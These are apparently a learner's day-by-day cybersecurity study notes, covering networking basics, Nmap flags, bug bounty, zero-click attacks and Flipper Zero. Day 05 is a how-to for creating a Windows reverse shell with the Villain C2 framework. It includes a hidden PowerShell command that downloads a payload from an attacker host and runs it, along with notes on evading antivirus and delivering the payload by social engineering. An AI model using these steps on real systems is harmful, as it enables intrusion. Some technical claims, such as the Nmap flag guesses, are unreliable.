# Day 01
Welcome to my Repositiory

# Day 02
How to download **virtual box**.
How to download **kali linux**.

# Day 03
**Command lines:**
clear-clears the terminal screen
cd-home directory(home)
ls-list the files
pwd-shows current directory
mkdir-create a new directory
rm-delete a file`

# Day 04
**IPV4 - IPV 6 DIFF:**
Here's a detailed comparison between IPv4 and IPv6, the two major versions of the Internet Protocol:
=> Key Differences
-> Address Space
- IPv4: Limited to ~4.3 billion addresses.
- IPv6: Vast space to support trillions of devices, solving address exhaustion.
  -> Security
- IPv4: Relies on external protocols like IPSec.
- IPv6: Has built-in IPSec for secure communication.
  -> Configuration
- IPv4: Requires manual setup or DHCP.
- IPv6: Supports auto-configuration and renumbering.
  -> Transmission
- IPv4: Uses broadcasting, which can cause network congestion.
- IPv6: Uses multicast and anycast, improving efficiency.

-> Transition Strategies
- Dual Stack: Devices run both IPv4 and IPv6 simultaneously.
- Tunneling: IPv6 packets are encapsulated in IPv4 for compatibility.
- Translation (NAT64): Converts IPv6 to IPv4 and vice versa.

**UDPS BROTHER OF TCP:**
Imagine sending a message across a river:
- TCP builds a bridge first, checks every step, and ensures the message arrives safely and in order.
- UDP just tosses the message across — fast, but risky. If it lands, great. If not, it doesn’t care.

**DYNAMIC AND STATIC  IP ADDRESS**:
- Static IP: Like a permanent home address — always the same, easy to find.
- Dynamic IP: Like a hotel room — changes every time you check in.

- Static IP: Request from ISP or configure manually in device settings.
- Dynamic IP: Automatically assigned by DHCP server (default for most ISPs).

- Which One Should You Use?
- Choose Static IP if:
  =You're hosting a server or website.
  =You need consistent remote access.
  =You're using VoIP or VPN services.
- Choose Dynamic IP if:
  =You're a regular user browsing the internet.
  =You want better privacy and lower cost.
  =You don’t need fixed access to your device.

**NETWORK:**
 Nodes: Devices like computers, printers, or phones
 Transmission Media: Wired (Ethernet, fiber) or wireless (Wi-Fi, Bluetooth)
 Networking Devices:
- Router: Connects different networks
- Switch: Connects devices within a LAN
- Hub: Broadcasts data to all devices
- Modem: Converts digital to analog signals

**IP ADDRESS:**
- Identification: Each device gets a unique IP to identify it on the network.
- Routing: Routers use IPs to forward data packets to the correct destination.
- Communication: IPs are embedded in every packet to ensure accurate delivery.
- NAT (Network Address Translation): Converts private IPs to public IPs for internet access.
   How to Find Your IP Address?
- Windows: ipconfig in Command Prompt
- Linux: ip a or ifconfig
  

**MAC ID:**
A MAC ID (Media Access Control Identifier) is a unique hardware address assigned to a network interface card (NIC) by the manufacturer. It operates at the Data Link Layer (Layer 2) of the OSI model and is used for local network communication.

PAYLOAD - IS LIKE SHUTTER OF ROCKET:
In computer networking, a payload is the actual data being transmitted in a packet. It excludes headers, metadata, or control information used for routing and delivery.
Cybersecurity
- In malware, the payload is the malicious part that performs harmful actions (e.g., deleting files, encrypting data).
- The rest of the virus may just be for spreading or hiding.


HOW THE DATA IS TAKEN:
-FIRST IT COMPROMISES ALL THE OS(WINDOWS,MAC,KALI LINUX)
-SPAM UAC PRMOPT - CONTINUOUS OR LOOPED PERMISSION NOTICE UNTILL GETTING GRANT FOR ADMINISTRATIVE ACCESS THEN FULL CONTROL IS TAKEN BY THE HACKER. 
WHAT IS CURSOR...
RECONNAISSANCE..
PASSIVE AND ACTIVE INFORMAION GATHERING --NOTES
WAYBACK MACHINE - WEBSITE WHERE YOU CAN SEE THE HISTORY OF THE URL 

**CLOUDFLARE:**
is a global cloud platform that provides security, performance, and reliability services for websites, applications, and networks. It acts as a reverse proxy between users and web servers, offering protection and acceleration


Bn-As-O-oN--script-vv-p-sS-sT:
- -Bn: This doesn't match any standard Linux or networking command. It might be a custom flag used in a script or tool.
- -As: Could possibly stand for "assign" or "asynchronous," but it's not a standard option in common tools.
- -O: Often used to mean "optimize" or "output" in various commands.
- -oN: This is a valid Nmap option that specifies output in normal format.
- --script: A common flag in tools like Nmap to run a specific script.
- -vv: A verbosity flag used in many tools (like Nmap or curl) to increase the amount of output detail.
- -p: Used to specify a port number, especially in Nmap.
- -sS: A TCP SYN scan option in Nmap, used for stealth scanning.
- -sT: A TCP connect scan option in Nmap, used when SYN scan isn’t possible.
So, if this is part of an Nmap command

# Day 05
**Creating Reverse shell for Windows Hacking using Villain FrameWork**

Villain is a high-level Stage 0/1 command-and-control (C2) framework that:
- Handles multiple reverse TCP and HoaxShell-based shells
- Enhances shell functionality with built-in utilities
- Supports session sharing across sibling servers (other Villain instances)
- Offers payload generation, obfuscation, and fileless execution features

**Install Villain on Kali Linux**
Villain is optimized for Kali Linux but can be adapted for other platforms with Python support.
**code snippets:**
git clone https://github.com/t3l3machus/Villain
cd Villain
pip3 install -r requirements.txt
sudo apt install gnome-terminal

**Generate Payload**
Villain supports PowerShell-based payloads
**code snippets:**
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker-ip>:<port>/payload.ps1')"

You can use Villain’s built-in payload generator or customize your own:
**code snippets:**
python3 Villain.py -p 443

**Obfuscate Payload (Optional)**:
**Villain includes auto-obfuscation to bypass AV:**
- Encodes PowerShell commands
- Wraps them in try-catch blocks to preserve stderr
- Avoids common shell hang-ups.
**Execution on Target (Windows):**
- Use social engineering or exploit delivery to run the obfuscated PowerShell payload on the target.
- Once executed, the shell connects back to your Villain server.
**Legal Disclaimer:**
Using Villain or any reverse shell against systems without explicit permission is illegal. This tool is intended for authorized penetration testing and CTF environments only.
**Villain Framework – Command Reference:**
A categorized list of Villain C2 Framework commands with their uses.
Use this for penetration testing in authorized lab environments only.

# Day 06
**BUG BOUNTY**

**Introduction**:
A Bug Bounty program is a system where companies allow ethical hackers to test their applications for security vulnerabilities. If a hacker finds a valid bug, they report it responsibly and receive a monetary reward or recognition.
**Objective:**
-Identify vulnerabilities in web applications legally
-Practice ethical hacking using proper tools
-Help companies fix security issues before attackers exploit them
**Notes:**
-Always have permission before testing any system.
-Use VPS and VPN for recon and scanning.
-Keep screenshots and logs as proof.
-Write clean, professional reports for higher chance of payout.
**Common Vulnerabilities Found in Bug Bounties:**
-Broken Access Control (BAC) – Users access data/actions they shouldn’t.
-IDOR (Insecure Direct Object Reference) – Example: Changing user ID in a URL to view another user’s data.
-XSS (Cross-Site Scripting) – Injecting malicious scripts in a web page.
-CSRF (Cross-Site Request Forgery) – Forcing users to execute unwanted actions.
-SQL Injection (SQLi) – Manipulating database queries.
-SSRF (Server-Side Request Forgery) – Making the server perform unauthorized requests.
-Authentication & Authorization Bypasses – Login without valid credentials.

**ZERO-CLICK ATTACK**

A Zero-Click Attack is a type of cyber attack that does not require the victim to click anything, download anything, or even do any action. The attacker can hack the device remotely and silently, often by exploiting vulnerabilities in messaging apps, email services, or communication protocols.
**Key Points about Zero-Click Attacks:**
-No user interaction required (no clicking links, no opening files).
-Usually targets smartphones, messaging apps (like WhatsApp, iMessage), or email clients.
-Hard to detect because the user does not see anything suspicious.
-Uses vulnerabilities in software to execute malicious code automatically.
-Often used for spying, stealing data, remote access, or installing spyware (e.g. Pegasus spyware).
Example:
A hacker sends a specially crafted message to your phone via iMessage or WhatsApp. You never even open it, but once it arrives, the vulnerability in the app gets triggered automatically, and the attacker gets access to your device.
**Why it is Dangerous?**
-No mistakes from user needed – the system gets hacked on its own.
-Hard to trace, hard to stop.
-The user may never know they were attacked.
-Used mostly in high-level spying or targeted attacks (journalists, activists, etc.).
**How to Protect?**
-Keep devices updated (patches fix these vulnerabilities).
-Use secure messaging apps with strong security updates.
-Use mobile security tools or antivirus.
-Disable auto-preview of messages (if possible).
-Avoid jailbreaking/rooting your phone.
**Summary**
A Zero-Click Attack is a dangerous type of hacking where the attacker doesn't need any help from the victim. Just receiving a malicious message or file is enough for the device to be infected. It relies on hidden vulnerabilities in apps or operating systems and is very hard to detect or stop.

**FLIPPER ZERO**

Flipper Zero is a portable multi-tool device for pentesters, hackers, and hardware geeks. It looks like a small Tamagotchi toy with a cute dolphin on the screen — but it's actually a powerful hacking gadget that supports multiple wireless protocols and access technologies.
**Main Features of Flipper Zero:**
-RFID & NFC: Read, copy, and emulate RFID cards (125kHz) and NFC cards (13.56 MHz). Used to clone entry cards used in offices, hostels, etc.
-Sub-GHz Radio: Capture and replay signals from wireless remotes (garage doors, wireless bells, car keys) that use frequencies like 315 MHz, 433 MHz, etc.
-Infrared (IR): Control TVs, Air Conditioners, etc. Works like a universal remote.
-Bluetooth / BLE: Interact with smart devices that use Bluetooth Low Energy.
-GPIO Ports: Can connect to hardware, sensors, IoT devices; works like a mini hardware hacking platform.
**What Can It Do?**
-Open or clone RFID access cards (if not secured properly)
-Copy NFC hotel cards
-Change TV channels in public places using IR
-Intercept and replay wireless remote signals (e.g., doorbells)
-Bruteforce weak access control systems
-Interact with smart IoT devices
-Use community-made plugins to do Wi-Fi scanning, signal jamming, etc. (with custom firmware)
**Is it Legal or Illegal?**
-The device itself is legal.
-It becomes illegal if you use it to break into systems or clone someone’s card without permission.
-Used responsibly, it is a good ethical hacking and learning tool.
**Why is Flipper Zero Popular?**
-Portable, small, easy to carry in your pocket.
-No computer needed — standalone hacking tool.
-Has a fun interface with a digital pet.
-Huge community making custom firmware and plug-ins.
-Great for learning RF, IoT, and access control hacking.





